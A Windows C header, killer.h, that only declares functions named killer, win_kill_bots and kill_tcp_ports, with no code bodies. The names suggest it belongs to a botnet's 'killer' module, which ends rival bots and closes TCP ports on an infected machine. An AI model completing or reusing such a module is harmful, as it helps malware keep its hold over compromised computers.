#ifndef KILLER_H
#define KILLER_H

#include <windows.h>

void killer();
void win_kill_bots();
void kill_tcp_ports(const int *ports, int num_ports);
void kill_tcp_ports_list();

#endif